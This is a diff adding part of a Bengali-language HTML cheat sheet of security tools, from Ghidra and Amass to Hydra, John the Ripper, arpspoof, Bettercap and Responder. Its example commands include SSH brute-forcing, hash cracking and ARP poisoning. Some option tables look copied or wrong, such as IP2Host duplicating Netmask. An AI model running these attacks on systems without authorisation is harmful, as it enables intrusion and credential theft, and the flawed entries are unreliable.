+<p><strong>সিনট্যাক্স:</strong> <code>analyzeHeadless &lt;project_location&gt; &lt;project_name&gt; [options]</code></p>
+<table>
+<tr><th>অপশন</th><th>বর্ণনা</th></tr>
+<tr><td>-import &lt;file&gt;</td><td>বাইনারি ইমপোর্ট</td></tr>
+<tr><td>-recursive</td><td>রিকার্সিভ ডিরেক্টরি</td></tr>
+<tr><td>-readOnly</td><td>শুধু পড়া</td></tr>
+<tr><td>-overwrite</td><td>ওভাররাইট</td></tr>
+<tr><td>-log &lt;file&gt;</td><td>লগ ফাইল</td></tr>
+<tr><td>-deleteProject</td><td>প্রজেক্ট ডিলিট</td></tr>
+<tr><td>-server &lt;server&gt;</td><td>Ghidra সার্ভার</td></tr>
+<tr><td>-connect &lt;repo&gt;</td><td>রিপোজিটরি কানেক্ট</td></tr>
+</table>
+<div class="example"><strong>উদাহরণ:</strong> <code>analyzeHeadless /projects MyProject -import binary.exe -recursive</code></div>
+
+<!-- ==================== ২৮. SpiderFoot ==================== -->
+<h2>২৮. SpiderFoot</h2>
+<p><strong>সিনট্যাক্স:</strong> <code>spiderfoot [options]</code></p>
+<table>
+<tr><th>অপশন</th><th>বর্ণনা</th></tr>
+<tr><td>-s &lt;target&gt;</td><td>টার্গেট</td></tr>
+<tr><td>-t &lt;type&gt;</td><td>টার্গেট টাইপ</td></tr>
+<tr><td>-m &lt;modules&gt;</td><td>নির্দিষ্ট মডিউল</td></tr>
+<tr><td>-u {all,footprint,investigate,passive}</td><td>ইউজ কেস</td></tr>
+<tr><td>-o &lt;format&gt;</td><td>আউটপুট ফরম্যাট</td></tr>
+<tr><td>-q</td><td>কোয়ায়েট</td></tr>
+<tr><td>-d</td><td>ডিবাগ</td></tr>
+<tr><td>-h</td><td>হেল্প</td></tr>
+<tr><td>-s &lt;server&gt;</td><td>সার্ভার URL</td></tr>
+<tr><td>-C &lt;scanID&gt;</td><td>করিলেট</td></tr>
+</table>
+<div class="example"><strong>উদাহরণ:</strong> <code>spiderfoot -s example.com -u footprint -o json -q</code></div>
+
+<!-- ==================== ২৯. Amass ==================== -->
+<h2>২৯. Amass</h2>
+<p><strong>সাব-কমান্ড:</strong> <code>amass enum [options] -d DOMAIN</code></p>
+<table>
+<tr><th>অপশন</th><th>বর্ণনা</th></tr>
+<tr><td>-d &lt;domain&gt;</td><td>টার্গেট ডোমেইন</td></tr>
+<tr><td>-passive</td><td>প্যাসিভ এনুমারেশন</td></tr>
+<tr><td>-active</td><td>অ্যাক্টিভ রিকন</td></tr>
+<tr><td>-brute</td><td>ব্রুট-ফোর্স</td></tr>
+<tr><td>-o &lt;file&gt;</td><td>আউটপুট</td></tr>
+<tr><td>-oA &lt;prefix&gt;</td><td>অল আউটপুট</td></tr>
+<tr><td>-json &lt;file&gt;</td><td>JSON আউটপুট</td></tr>
+<tr><td>-ip</td><td>IP দেখায়</td></tr>
+<tr><td>-silent</td><td>সাইলেন্ট</td></tr>
+<tr><td>-exclude</td><td>বাদ</td></tr>
+<tr><td>-include</td><td>অন্তর্ভুক্ত</td></tr>
+<tr><td>-timeout</td><td>টাইমআউট</td></tr>
+</table>
+<div class="example"><strong>উদাহরণ:</strong> <code>amass enum -passive -d example.com -o subs.txt</code></div>
+
+<!-- ==================== ৩০. Burp Suite ==================== -->
+<h2>৩০. Burp Suite</h2>
+<table>
+<tr><th>অপশন</th><th>বর্ণনা</th></tr>
+<tr><td>--project-file &lt;file&gt;</td><td>প্রজেক্ট ফাইল লোড</td></tr>
+<tr><td>--config-file &lt;file&gt;</td><td>কনফিগ লোড</td></tr>
+<tr><td>--user-config-file &lt;file&gt;</td><td>ইউজার কনফিগ</td></tr>
+<tr><td>--disable-extensions</td><td>এক্সটেনশন ছাড়া শুরু</td></tr>
+<tr><td>--use-defaults</td><td>ডিফল্ট কনফিগ</td></tr>
+<tr><td>--unpause-spider-and-scanner</td><td>স্পাইডার ও স্ক্যানার চালু</td></tr>
+<tr><td>--collaborator-server</td><td>কোলাবোরেটর সার্ভার</td></tr>
+<tr><td>--help</td><td>হেল্প</td></tr>
+</table>
+<p><strong>JAR চালানো:</strong> <code>java -jar burpsuite_community.jar -Xmx4G</code></p>
+
+<!-- ==================== ৩১. FoxyProxy ==================== -->
+<h2>৩১. FoxyProxy</h2>
+<p><strong>ফায়ারফক্স:</strong> <code>firefox.exe -foxyproxy-mode &lt;proxy_id&gt;</code></p>
+<p><strong>cURL:</strong> <code>curl -x username:password@servername.getfoxyproxy.org:3128 http://example.com</code></p>
+<p><strong>NPM Foxy CLI:</strong> <code>foxy http://magento.dev</code></p>
+
+<!-- ==================== ৩২. VirusTotal CLI ==================== -->
+<h2>৩২. VirusTotal CLI (vt-cli)</h2>
+<table>
+<tr><th>কমান্ড</th><th>বর্ণনা</th></tr>
+<tr><td>vt init</td><td>API কী সেটআপ</td></tr>
+<tr><td>vt scan file &lt;path&gt;</td><td>ফাইল স্ক্যান</td></tr>
+<tr><td>vt scan url &lt;url&gt;</td><td>URL স্ক্যান</td></tr>
+<tr><td>vt analysis &lt;id&gt;</td><td>অ্যানালাইসিস রিপোর্ট</td></tr>
+<tr><td>vt search &lt;query&gt;</td><td>সার্চ</td></tr>
+<tr><td>vt download &lt;hash&gt;</td><td>ফাইল ডাউনলোড</td></tr>
+<tr><td>vt comments &lt;hash&gt;</td><td>কমেন্ট</td></tr>
+<tr><td>vt hunting</td><td>হান্টিং কমান্ড</td></tr>
+<tr><td>vt collection</td><td>কালেকশন কমান্ড</td></tr>
+</table>
+<div class="example"><strong>উদাহরণ:</strong> <code>vt scan file suspicious.exe</code></div>
+
+<!-- ==================== ৩৩. ARP Spoofing ==================== -->
+<h2>৩৩. ARP Spoofing (arpspoof)</h2>
+<p><strong>সিনট্যাক্স:</strong> <code>arpspoof [-i interface] [-c own|host|both] [-t target] [-r] host</code></p>
+<table>
+<tr><th>অপশন</th><th>বর্ণনা</th></tr>
+<tr><td>-i &lt;interface&gt;</td><td>নেটওয়ার্ক ইন্টারফেস</td></tr>
+<tr><td>-t &lt;target&gt;</td><td>টার্গেট IP</td></tr>
+<tr><td>-r</td><td>বাই-ডিরেকশনাল পয়জনিং</td></tr>
+<tr><td>-c own|host|both</td><td>কোন MAC ব্যবহার করবে</td></tr>
+</table>
+<div class="example"><strong>উদাহরণ:</strong> <code>sudo arpspoof -i eth0 -t 192.168.20.11 192.168.20.10</code></div>
+
+<!-- ==================== ৩৪. IP2Host ==================== -->
+<h2>৩৪. IP2Host</h2>
+<p><strong>সিনট্যাক্স:</strong> <code>ip2host [OPTIONS] [cache_file] &lt; infile &gt; outfile</code></p>
+<table>
+<tr><th>অপশন</th><th>বর্ণনা</th></tr>
+<tr><td>-h, --help</td><td>হেল্প</td></tr>
+<tr><td>-v, --version</td><td>ভার্সন</td></tr>
+<tr><td>-d, --debug</td><td>ডিবাগ</td></tr>
+<tr><td>-s, --standard</td><td>স্ট্যান্ডার্ড আউটপুট</td></tr>
+<tr><td>-c, --cidr</td><td>CIDR ফরম্যাট</td></tr>
+<tr><td>-r, --range</td><td>IP রেঞ্জ</td></tr>
+<tr><td>-x, --hex</td><td>হেক্স আউটপুট</td></tr>
+<tr><td>-b, --binary</td><td>বাইনারি আউটপুট</td></tr>
+<tr><td>-n, --nodns</td><td>DNS ছাড়া</td></tr>
+</table>
+<div class="example"><strong>উদাহরণ:</strong> <code>ip2host &lt; access.log &gt; resolved.log</code></div>
+
+<!-- ==================== ৩৫. BitCard Viewer ==================== -->
+<h2>৩৫. BitCard Viewer</h2>
+<table>
+<tr><th>কমান্ড</th><th>বর্ণনা</th></tr>
+<tr><td>pcsc_scan</td><td>স্মার্ট কার্ড রিডার স্ক্যান</td></tr>
+<tr><td>scriptor</td><td>APDU কমান্ড পাঠায়</td></tr>
+<tr><td>cardpeek</td><td>GUI টুল</td></tr>
+</table>
+<div class="example"><strong>উদাহরণ:</strong> <code>pcsc_scan</code></div>
+
+<!-- ==================== ৩৬. Hydra ==================== -->
+<h2>৩৬. Hydra</h2>
+<p><strong>সিনট্যাক্স:</strong> <code>hydra [options] target service</code></p>
+<table>
+<tr><th>অপশন</th><th>বর্ণনা</th></tr>
+<tr><td>-l &lt;login&gt;</td><td>একক ইউজারনেম</td></tr>
+<tr><td>-L &lt;file&gt;</td><td>ইউজারনেম লিস্ট</td></tr>
+<tr><td>-p &lt;pass&gt;</td><td>একক পাসওয়ার্ড</td></tr>
+<tr><td>-P &lt;file&gt;</td><td>পাসওয়ার্ড লিস্ট</td></tr>
+<tr><td>-C &lt;file&gt;</td><td>কম্বো লিস্ট</td></tr>
+<tr><td>-t &lt;tasks&gt;</td><td>টাস্ক সংখ্যা</td></tr>
+<tr><td>-f</td><td>প্রথম সফল লগইনে থামে</td></tr>
+<tr><td>-o &lt;file&gt;</td><td>আউটপুট</td></tr>
+<tr><td>-vV</td><td>ভারবোস</td></tr>
+<tr><td>-s &lt;port&gt;</td><td>পোর্ট</td></tr>
+<tr><td>-4 / -6</td><td>IPv4 / IPv6</td></tr>
+<tr><td>-d</td><td>ডিবাগ</td></tr>
+</table>
+<div class="example"><strong>উদাহরণ:</strong> <code>hydra -l admin -P passwords.txt ssh://192.168.1.1</code></div>
+
+<!-- ==================== ৩৭. Patator ==================== -->
+<h2>৩৭. Patator</h2>
+<p><strong>সিনট্যাক্স:</strong> <code>patator &lt;module&gt; [options] host=target param=value...</code></p>
+<table>
+<tr><th>অপশন</th><th>বর্ণনা</th></tr>
+<tr><td>-t &lt;N&gt;</td><td>থ্রেড</td></tr>
+<tr><td>--timeout &lt;sec&gt;</td><td>টাইমআউট</td></tr>
+<tr><td>--retries &lt;N&gt;</td><td>রিট্রাই</td></tr>
+<tr><td>-x &lt;condition&gt;</td><td>কন্ডিশন</td></tr>
+<tr><td>-l &lt;dir&gt;</td><td>লগ ডিরেক্টরি</td></tr>
+<tr><td>--rate-limit &lt;sec&gt;</td><td>রেট লিমিট</td></tr>
+<tr><td>FILE0, FILE1</td><td>ওয়ার্ডলিস্ট প্লেসহোল্ডার</td></tr>
+</table>
+<p><strong>মডিউল:</strong> ssh_login, ftp_login, http_fuzz, smtp_login, ইত্যাদি।</p>
+<div class="example"><strong>উদাহরণ:</strong> <code>patator ssh_login host=192.168.1.1 user=FILE0 password=FILE1 0=users.txt 1=pass.txt --rate-limit=1</code></div>
+
+<!-- ==================== ৩৮. John the Ripper ==================== -->
+<h2>৩৮. John the Ripper</h2>
+<p><strong>সিনট্যাক্স:</strong> <code>john [options] [passwordfiles]</code></p>
+<table>
+<tr><th>অপশন</th><th>বর্ণনা</th></tr>
+<tr><td>--wordlist=&lt;file&gt;</td><td>ওয়ার্ডলিস্ট অ্যাটাক</td></tr>
+<tr><td>--format=&lt;format&gt;</td><td>হ্যাশ ফরম্যাট</td></tr>
+<tr><td>--incremental</td><td>ব্রুট ফোর্স</td></tr>
+<tr><td>--rules</td><td>ওয়ার্ড ম্যাঙ্গলিং</td></tr>
+<tr><td>--single</td><td>সিঙ্গেল ক্র্যাক মোড</td></tr>
+<tr><td>--restore</td><td>সেশন রিস্টোর</td></tr>
+<tr><td>--show</td><td>ক্র্যাকড পাসওয়ার্ড দেখায়</td></tr>
+<tr><td>--list=formats</td><td>ফরম্যাট লিস্ট</td></tr>
+<tr><td>--stdin</td><td>স্টিডিন থেকে পড়ে</td></tr>
+<tr><td>--status</td><td>স্ট্যাটাস</td></tr>
+</table>
+<div class="example"><strong>উদাহরণ:</strong> <code>john --wordlist=rockyou.txt hashes.txt</code></div>
+
+<!-- ==================== ৩৯. Netmask ==================== -->
+<h2>৩৯. Netmask</h2>
+<p><strong>সিনট্যাক্স:</strong> <code>netmask [options] spec [spec...]</code></p>
+<table>
+<tr><th>অপশন</th><th>বর্ণনা</th></tr>
+<tr><td>-h, --help</td><td>হেল্প</td></tr>
+<tr><td>-v, --version</td><td>ভার্সন</td></tr>
+<tr><td>-d, --debug</td><td>ডিবাগ</td></tr>
+<tr><td>-s, --standard</td><td>স্ট্যান্ডার্ড আউটপুট</td></tr>
+<tr><td>-c, --cidr</td><td>CIDR ফরম্যাট</td></tr>
+<tr><td>-i, --cisco</td><td>Cisco স্টাইল</td></tr>
+<tr><td>-r, --range</td><td>IP রেঞ্জ</td></tr>
+<tr><td>-x, --hex</td><td>হেক্স</td></tr>
+<tr><td>-o, --octal</td><td>অক্টাল</td></tr>
+<tr><td>-b, --binary</td><td>বাইনারি</td></tr>
+<tr><td>-n, --nodns</td><td>DNS ছাড়া</td></tr>
+</table>
+<div class="example"><strong>উদাহরণ:</strong> <code>netmask -c 192.168.1.0/24</code></div>
+
+<!-- ==================== ৪০. Smtp-user-enum ==================== -->
+<h2>৪০. Smtp-user-enum</h2>
+<p><strong>সিনট্যাক্স:</strong> <code>smtp-user-enum [options] ( -u username | -U file ) ( -t host | -T file )</code></p>
+<table>
+<tr><th>অপশন</th><th>বর্ণনা</th></tr>
+<tr><td>-u &lt;user&gt;</td><td>একক ইউজারনেম</td></tr>
+<tr><td>-U &lt;file&gt;</td><td>ইউজারনেম লিস্ট</td></tr>
+<tr><td>-t &lt;host&gt;</td><td>একক টার্গেট</td></tr>
+<tr><td>-T &lt;file&gt;</td><td>টার্গেট লিস্ট</td></tr>
+<tr><td>-M &lt;mode&gt;</td><td>মেথড (VRFY, EXPN, RCPT)</td></tr>
+<tr><td>-m &lt;n&gt;</td><td>সর্বোচ্চ প্রসেস</td></tr>
+<tr><td>-D &lt;domain&gt;</td><td>ডোমেইন</td></tr>
+<tr><td>--help</td><td>হেল্প</td></tr>
+<tr><td>--list-modes</td><td>মোড লিস্ট</td></tr>
+</table>
+<div class="example"><strong>উদাহরণ:</strong> <code>smtp-user-enum -M VRFY -U users.txt -t 10.0.0.1</code></div>
+
+<!-- ==================== ৪১. Bettercap ==================== -->
+<h2>৪১. Bettercap</h2>
+<p><strong>সিনট্যাক্স:</strong> <code>bettercap [options]</code></p>
+<table>
+<tr><th>অপশন</th><th>বর্ণনা</th></tr>
+<tr><td>-iface &lt;interface&gt;</td><td>ইন্টারফেস</td></tr>
+<tr><td>-eval "&lt;commands&gt;"</td><td>কমান্ড চালায়</td></tr>
+<tr><td>-caplet &lt;file&gt;</td><td>ক্যাপলেট লোড</td></tr>
+<tr><td>-caplets-path &lt;path&gt;</td><td>ক্যাপলেট পাথ</td></tr>
+<tr><td>-env-file &lt;file&gt;</td><td>এনভায়রনমেন্ট ফাইল</td></tr>
+<tr><td>-autostart &lt;modules&gt;</td><td>অটোস্টার্ট মডিউল</td></tr>
+<tr><td>-gateway-override &lt;ip&gt;</td><td>গেটওয়ে ওভাররাইড</td></tr>
+<tr><td>-X, --sniffer</td><td>স্নিফার এনাবল</td></tr>
+<tr><td>-L, --local</td><td>লোকাল ট্রাফিক</td></tr>
+<tr><td>-I &lt;iface&gt;</td><td>ইন্টারফেস</td></tr>
+<tr><td>-G &lt;gateway&gt;</td><td>গেটওয়ে</td></tr>
+<tr><td>-T &lt;target&gt;</td><td>টার্গেট</td></tr>
+<tr><td>--ignore &lt;addrs&gt;</td><td>ইগনোর অ্যাড্রেস</td></tr>
+</table>
+<div class="example"><strong>উদাহরণ:</strong> <code>sudo bettercap -iface eth0 -eval "set arp.spoof.targets 192.168.1.10; arp.spoof on"</code></div>
+
+<!-- ==================== ৪২. Shodan CLI ==================== -->
+<h2>৪২. Shodan CLI</h2>
+<table>
+<tr><th>কমান্ড</th><th>বর্ণনা</th></tr>
+<tr><td>shodan init &lt;api_key&gt;</td><td>API কী সেট</td></tr>
+<tr><td>shodan info</td><td>অ্যাকাউন্ট তথ্য</td></tr>
+<tr><td>shodan search &lt;query&gt;</td><td>সার্চ</td></tr>
+<tr><td>shodan host &lt;ip&gt;</td><td>হোস্ট ডিটেইল</td></tr>
+<tr><td>shodan count &lt;query&gt;</td><td>ফলাফল সংখ্যা</td></tr>
+<tr><td>shodan download &lt;query&gt;</td><td>ডাউনলোড</td></tr>
+<tr><td>shodan parse &lt;file&gt;</td><td>ফাইল পার্স</td></tr>
+<tr><td>shodan alert</td><td>অ্যালার্ট ম্যানেজ</td></tr>
+<tr><td>shodan convert</td><td>ফরম্যাট কনভার্ট</td></tr>
+<tr><td>shodan stream</td><td>রিয়েল-টাইম স্ট্রিম</td></tr>
+<tr><td>shodan domain &lt;domain&gt;</td><td>ডোমেইন DNS</td></tr>
+</table>
+<p><strong>সার্চ অপশন:</strong> --fields, --limit, --separator</p>
+<div class="example"><strong>উদাহরণ:</strong> <code>shodan search --fields ip_str,port,org "apache country:IN"</code></div>
+
+<!-- ==================== ৪৩. ProxyChains ==================== -->
+<h2>৪৩. ProxyChains</h2>
+<p><strong>সিনট্যাক্স:</strong> <code>proxychains [-q] [-f configfile] &lt;program&gt; [args]</code></p>
+<table>
+<tr><th>অপশন</th><th>বর্ণনা</th></tr>
+<tr><td>-q</td><td>কোয়ায়েট মোড</td></tr>
+<tr><td>-Q</td><td>নন-কোয়ায়েট</td></tr>
+<tr><td>-f &lt;file&gt;</td><td>কনফিগ ফাইল</td></tr>
+<tr><td>-l &lt;level&gt;</td><td>লগ লেভেল</td></tr>
+<tr><td>-h, --help</td><td>হেল্প</td></tr>
+</table>
+<div class="example"><strong>উদাহরণ:</strong> <code>proxychains -q nmap -sT -Pn 192.168.1.1</code></div>
+
+<!-- ==================== ৪৪. Lynis ==================== -->
+<h2>৪৪. Lynis</h2>
+<p><strong>সিনট্যাক্স:</strong> <code>lynis [scan mode] [options]</code></p>
+<table>
+<tr><th>কমান্ড/অপশন</th><th>বর্ণনা</th></tr>
+<tr><td>audit &lt;type&gt;</td><td>অডিট</td></tr>
+<tr><td>show &lt;parameter&gt;</td><td>তথ্য দেখায়</td></tr>
+<tr><td>update &lt;parameter&gt;</td><td>আপডেট</td></tr>
+<tr><td>--checkall, -c</td><td>সম্পূর্ণ চেক</td></tr>
+<tr><td>--cronjob</td><td>ক্রনজব মোড</td></tr>
+<tr><td>--pentest</td><td>পেন্টেস্ট মোড</td></tr>
+<tr><td>--quick, -Q</td><td>কুইক মোড</td></tr>
+<tr><td>--quiet, -q</td><td>সাইলেন্ট</td></tr>
+<tr><td>--no-colors</td><td>কালার ছাড়া</td></tr>
+<tr><td>--debug</td><td>ডিবাগ</td></tr>
+<tr><td>--auditor &lt;name&gt;</td><td>অডিটর নাম</td></tr>
+<tr><td>--logfile &lt;file&gt;</td><td>লগ ফাইল</td></tr>
+<tr><td>--forensics</td><td>ফরেনসিক মোড</td></tr>
+</table>
+<div class="example"><strong>উদাহরণ:</strong> <code>lynis audit system --quick</code></div>
+
+<!-- ==================== ৪৫. BleachBit ==================== -->
+<h2>৪৫. BleachBit</h2>
+<p><strong>সিনট্যাক্স:</strong> <code>bleachbit [OPTIONS] [cleaner.option...]</code></p>
+<table>
+<tr><th>অপশন</th><th>বর্ণনা</th></tr>
+<tr><td>-h, --help</td><td>হেল্প</td></tr>
+<tr><td>-l, --list-cleaners</td><td>ক্লিনার লিস্ট</td></tr>
+<tr><td>-p, --preview</td><td>প্রিভিউ</td></tr>
+<tr><td>-c, --clean</td><td>ক্লিন</td></tr>
+<tr><td>--preset</td><td>GUI প্রিসেট</td></tr>
+<tr><td>--shred &lt;file&gt;</td><td>সিকিউর ডিলিট</td></tr>
+<tr><td>--wipe-free-space &lt;path&gt;</td><td>ফ্রি স্পেস ওয়াইপ</td></tr>
+<tr><td>--sysinfo</td><td>সিস্টেম ইনফো</td></tr>
+<tr><td>--all-but-warning</td><td>ওয়ার্নিং ছাড়া সব</td></tr>
+<tr><td>--debug-log=&lt;file&gt;</td><td>ডিবাগ লগ</td></tr>
+<tr><td>-o, --overwrite</td><td>ওভাররাইট</td></tr>
+</table>
+<div class="example"><strong>উদাহরণ:</strong> <code>bleachbit --clean firefox.cache firefox.cookies</code></div>
+
+<!-- ==================== ৪৬. Nslookup ==================== -->
+<h2>৪৬. Nslookup</h2>
+<p><strong>সিনট্যাক্স:</strong> <code>nslookup [options] [host] [server]</code></p>
+<table>
+<tr><th>অপশন</th><th>বর্ণনা</th></tr>
+<tr><td>-type=&lt;type&gt;</td><td>রেকর্ড টাইপ (A, AAAA, MX, NS, TXT, SOA, PTR, CNAME, SRV, ANY)</td></tr>
+<tr><td>-query=&lt;type&gt;</td><td>কুয়েরি টাইপ</td></tr>
+<tr><td>-class=&lt;class&gt;</td><td>DNS ক্লাস (IN, CH, HS, ANY)</td></tr>
+<tr><td>-debug</td><td>ডিবাগ</td></tr>
+<tr><td>-vc</td><td>TCP ব্যবহার</td></tr>
+<tr><td>-timeout=&lt;sec&gt;</td><td>টাইমআউট</td></tr>
+<tr><td>-port=&lt;port&gt;</td><td>পোর্ট</td></tr>
+<tr><td>-retry=&lt;n&gt;</td><td>রিট্রাই</td></tr>
+<tr><td>-h, --help</td><td>হেল্প</td></tr>
+</table>
+<p><strong>ইন্টারঅ্যাকটিভ কমান্ড:</strong> exit, finger, help, ls, lserver, root, server, set, view</p>
+<div class="example"><strong>উদাহরণ:</strong> <code>nslookup -type=mx example.com 8.8.8.8</code></div>
+
+<!-- ==================== ৪৭. CrimeFlare ==================== -->
+<h2>৪৭. CrimeFlare</h2>
+<p><strong>কমান্ড:</strong> <code>crimeflare</code> অথবা <code>crimeflare &lt;domain&gt;</code></p>
+<p><strong>PHP রান:</strong> <code>php crimeflare.php &lt;domain&gt;</code></p>
+<div class="example"><strong>উদাহরণ:</strong> <code>crimeflare example.com</code></div>
+<p><strong>ইনস্টলেশন:</strong> <code>sudo apt install php-curl</code> তারপর <code>crimeflare.php</code> কে <code>/bin/crimeflare</code> এ কপি করে <code>chmod +x</code></p>
+
+<!-- ==================== ৪৮. Responder ==================== -->
+<h2>৪৮. Responder</h2>
+<p><strong>সিনট্যাক্স:</strong> <code>sudo responder -I &lt;interface&gt; [options]</code></p>
+<table>
+<tr><th>অপশন</th><th>বর্ণনা</th></tr>
+<tr><td>-I, --interface &lt;iface&gt;</td><td>নেটওয়ার্ক ইন্টারফেস</td></tr>
+<tr><td>-A, --analyze</td><td>অ্যানালাইজ মোড (পয়জনিং ছাড়া)</td></tr>
+<tr><td>-i, --ip &lt;ip&gt;</td><td>লোকাল IP</td></tr>
+<tr><td>-e, --externalip &lt;ip&gt;</td><td>এক্সটার্নাল IP</td></tr>
+<tr><td>-d</td><td>DHCP উত্তর</td></tr>
+<tr><td>-w, --wredir</td><td>WPAD রিডাইরেক্ট</td></tr>
+<tr><td>-f, --fingerprint</td><td>হোস্ট ফিঙ্গারপ্রিন্ট</td></tr>
+<tr><td>-v, --verbose</td><td>ভারবোস</td></tr>
+<tr><td>--disable-ess</td><td>ESS ডিসেবল</td></tr>
+<tr><td>--disable-ldap</td><td>LDAP ডিসেবল</td></tr>
+<tr><td>--basic</td><td>বেসিক HTTP অথেন্টিকেশন</td></tr>
+<tr><td>--ProxyAuth</td><td>প্রক্সি অথেন্টিকেশন</td></tr>
+<tr><td>-h, --help</td><td>হেল্প</td></tr>
+<tr><td>--version</td><td>ভার্সন</td></tr>
+</table>
+<div class="example"><strong>উদাহরণ:</strong> <code>sudo responder -I eth0 -A</code></div>
+
+</body>
+</html>
